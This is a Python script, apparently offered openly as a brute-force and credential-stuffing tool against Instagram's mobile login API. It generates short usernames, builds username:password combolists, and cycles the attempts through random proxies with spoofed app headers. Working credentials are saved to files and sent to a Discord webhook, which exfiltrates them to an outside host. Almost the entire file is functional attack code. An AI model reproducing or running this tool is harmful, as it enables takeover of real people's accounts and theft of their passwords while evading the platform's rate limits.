import secrets, uuid, random,  time,os
from os import name
try:
    import asyncio, requests
    from halo import Halo
except:
    os.system('pip install halo')
    os.system('pip install asyncio')
    os.system('pip install requests')
    import asyncio, requests
    from halo import Halo

letters1 = 'abcdefghijklmnopqrstuvwxyz'
characters = 'abcdefghijklmnopqrstuvwxyz._1234567890'
webhook = '' #PUT YOUR DISCORD WEBHOOK HERE
success = 0
secure = 0
fail = 0
banner = ("""

.______   .______       __    __  .___________. _______ 
|   _  \  |   _  \     |  |  |  | |           ||   ____|
|  |_)  | |  |_)  |    |  |  |  | `---|  |----`|  |__   
|   _  <  |      /     |  |  |  |     |  |     |   __|  
|  |_)  | |  |\  \----.|  `--'  |     |  |     |  |____ 
|______/  | _| `._____| \______/      |__|     |_______|
                                                        

        ~~V1 By joshua. @crackled on tele~~                                                             
                                                                       
""")

########################################

async def guess():
    global secure, fail, success
    secure = 0
    fail = 0
    success = 0
    clear()
    print('[Running] Running combolist!')
    try:
        for item in open('combos.txt', 'r').read().splitlines():
            user = item.split(":")[0]
            passs = item.split(":")[1]
            l = asyncio.ensure_future(spam(user,passs))
            

           
        await asyncio.wait([l])
        input('\n[!] Combolist completed! Press ENTER to return to main menu!')
    except Exception as e:
        print(e)
        time.sleep(3)


async def spam(username, passwd):
    global success,secure,fail
    loop = asyncio.get_event_loop()
    json, text = await loop.run_in_executor(None, login, username, passwd)
    if json['message'] == 'checkpoint_required':
        secure+=1
        status = '[CHECKPOINT] Login Block'
        with open('secure.txt', 'a') as f:
            f.write(f'{username}:{passwd}\n')
        disc(status,username, passwd)
    elif 'logged_in_user' in text:
        success+=1
        status = '[SUCCESS] Logged Into'
        with open('hits.txt', 'a') as f:
            f.write(f'{username}:{passwd}\n')
        disc(status,username, passwd)
    else:
        fail+=1
    clear()
    print(f"==========================================\nSuccess: {success}\nSecure: {secure}\nFail: {fail}\n==========================================\n ")


###########################################


def clear():
    if name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print(banner)


def disc(status, username, passw):
    webh = {"embeds":[{"title":f"New User: {username}!","description":f"**Status**: {status}\n-\n**Password**: ||{passw}||","url":f"https://instagram.com/{username}","color":14177041}],"username":"Slime Brute","avatar_url":"https://www.pandasecurity.com/en/mediacenter/src/uploads/2019/07/pandasecurity-How-do-hackers-pick-their-targets.jpg"}
    try:
        requests.post(webhook,json=webh)
    except:
        pass


def login(username, passwd):
    guid = str(uuid.uuid4())
    r = requests.session()
    lines = open('proxies.txt').read().splitlines()
    prox =random.choice(lines)
    proxies = {'https': 'http://%s' % (prox)}
    headers = {'User-Agent': 'Instagram 9.4.0 Android (30/11; 480dpi; 1080x2158; OPPO; CPH2069; OP4C7BL1; qcom; en_US; 276028020)', "Content-Type": "application/x-www-form-urlencoded","X-CSRFToken": "uNs1OZ6CPvJBSmmQOvWDKGFkm2frIDEY"}
    data = "username=" + username + "&password=" + passwd + "&device_id=android-" +  secrets.token_hex(8) +"&_csrftoken=2C3OWk1zw20DXvUj3lr7YT8nCEgGmJJq&phone_id=" + guid + "&guid=" + guid
    while True:
        try:
            response = r.post('https://b.i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies=proxies)
            break
        except:
                pass 
    return response.json(), response.text 


def get_length(file_name):
    with open(file_name) as f:
        lines = [line.rstrip() for line in f.readlines()]
    nonblanklines = [line for line in lines if line]
    return len(nonblanklines)




def combo():
    done = 0
    clear()
    print('[LOADING] Compiling combolist..')
    open('combos.txt', 'w')
    usernames = open('users.txt', 'r').read().splitlines()
    passwords = open('pass.txt', 'r').read().splitlines()
    num = (get_length('users.txt')) * (get_length('pass.txt'))
    clear()
    print(f"==========================================\nGenerating {num} Combos... \n==========================================\n ")
    try:
            for user in usernames:
                if user == "":
                    continue
                for password in passwords:
                    if password == "":
                        continue
                    else:
                        with open('combos.txt', 'a') as f:
                            f.write(f'{user}:{password}\n')
                            done+=1
                        
                    
                    
    except KeyboardInterrupt:
        pass

    print(f'[!] Successfully loaded {done}x combos!')
    time.sleep(5)


def gen(): # GENERATE USERS
    done = 0
    clear()
    try:
       file= open('users.txt', 'r').read().splitlines()
    except:
        open('users.txt', 'a')
        file= open('users.txt', 'r').read().splitlines()
    print("""[1] Generate 3L
[2] Generate 3C
[3] Generate 4L 
[4] Generate 4C
[5] Generate 5L
[6] Go Back To Main Menu\n""")
    try:
        choice = int(input('[+] Choose One: '))
        if choice == 1:
            num = int(input('[+] How many 3Ls to generate?: '))
            clear()
            print(f"==========================================\nGenerating {num} 4Cs... \n==========================================\n ")
            while True:
            
                user = ''.join(random.choice(letters1) for i in range(3))
                if user not in str(file):
                    with open('users.txt', 'a') as generated:
                        generated.write(f'{user}\n')
                    done+=1
                if done == num:
                    break
            print(f'[!] Done Generated {num}x users to users.txt!')
            time.sleep(5)
            return
        elif choice == 2:
            num = int(input('[+] How many 3Cs to generate?: '))
            clear()
            print(f"==========================================\nGenerating {num} 4Cs... \n==========================================\n ")
            while True:
                user = ''.join(random.choice(characters) for i in range(3))
                if user not in str(file):
                    with open('users.txt', 'a') as generated:
                        generated.write(f'{user}\n')
                    done+=1
                if done == num:
                    break
            print(f'[!] Done Generated {num}x users to users.txt!')
            time.sleep(5)
            return
        elif choice == 3:
            num = int(input('[+] How many 4Ls to generate?: '))
            clear()
            print(f"==========================================\nGenerating {num} 4Cs... \n==========================================\n ")
            while True:
                
                user = ''.join(random.choice(letters1) for i in range(4))
                if user not in str(file):
                    with open('users.txt', 'a') as generated:
                        generated.write(f'{user}\n')
                    done+=1
                if done == num:
                    break
            print(f'[!] Done Generated {num}x users to users.txt!')
            time.sleep(5)
            return
        elif choice == 4:
            num = int(input('[+] How many 4Cs to generate?: '))
            clear()
            print(f"==========================================\nGenerating {num} 4Cs... \n==========================================\n ")
            while True:
                
                user = ''.join(random.choice(characters) for i in range(4))
                if user not in str(file):
                    with open('users.txt', 'a') as generated:
                        generated.write(f'{user}\n')
                    done+=1
                if done == num:
                    break
            print(f'[!] Done Generated {num}x users to users.txt!')
            time.sleep(5)
            return
        elif choice == 5:
            num = int(input('[+] How many 5Ls to generate?: '))
            clear()
            print(f"==========================================\nGenerating {num} 4Cs... \n==========================================\n ")
            while True:
                
                user = user = ''.join(random.choice(letters1) for i in range(5))
                if user not in str(file):
                    with open('users.txt', 'a') as generated:
                        generated.write(f'{user}\n')
                    done+=1
                if done == num:
                    break
            print(f'[!] Done Generated {num}x users to users.txt!')
            time.sleep(5)
            return
        else:
            return
    except Exception as error:
        if "Value" or 'base' in error:
            print('Inputted value is not a number! Please use numbers that correspond with the action!!')
        else:
            print(f'Error: {error}')
        time.sleep(5)
        return



def panel():
    while True:
        clear()
        print("[1] Generate 3L/4L List")
        print('[2] Generate Combo List')
        print('[3] Run Combo List\n')
        action = input('[+] Choose One: ')
        if action == '1':
            gen()
        elif action == '2':
            combo()
        elif action == '3':
            try:
                asyncio.run(guess())
            except Exception as e:
                print(e)
                time.sleep(3)
        else:
            print('[!] Inputted value is not a number!')
            time.sleep(3)



if __name__ == '__main__':
    panel()
